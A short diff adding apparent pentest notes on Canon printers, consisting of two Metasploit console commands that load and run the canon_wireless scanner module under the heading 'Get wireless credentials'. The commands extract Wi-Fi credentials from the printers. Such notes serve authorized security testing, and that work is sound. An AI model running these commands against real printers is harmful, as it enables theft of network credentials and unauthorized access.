@@ -1,0 +1,6 @@
+# Pentesting Canon Printers
+
+
+# Get wireless credentials
+msf > use auxiliary/scanner/http/canon_wireless
+msf > run
